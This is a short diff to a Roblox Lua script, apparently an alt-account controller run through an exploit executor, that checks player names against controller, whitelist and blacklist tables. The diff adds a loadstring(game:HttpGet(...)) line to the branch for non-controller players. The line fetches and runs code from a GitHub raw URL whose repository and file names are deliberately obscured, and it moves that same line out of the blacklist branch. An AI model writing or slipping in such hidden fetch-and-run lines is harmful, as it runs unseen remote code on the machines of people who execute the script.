@@ -20,6 +20,7 @@ local AltControllers = {
 local p = game:GetService("Players").LocalPlayer
 if not table.find(AltControllers, p.Name) then
     p:Kick("Nope")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomalotfornoreason/IlIlIlI/main/IlIlIlIlI", true))()
 end
 
 local Whitelisted = {
@@ -98,7 +99,6 @@ if table.find(Blacklisted, game:GetService("Players").LocalPlayer.UserId) then
 end
 
 if isfile("123712091724.lua") then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomalotfornoreason/IlIlIlI/main/IlIlIlIlI", true))()
     wait(.1)
     game.Players.LocalPlayer:Kick("Blacklisted.")
 else
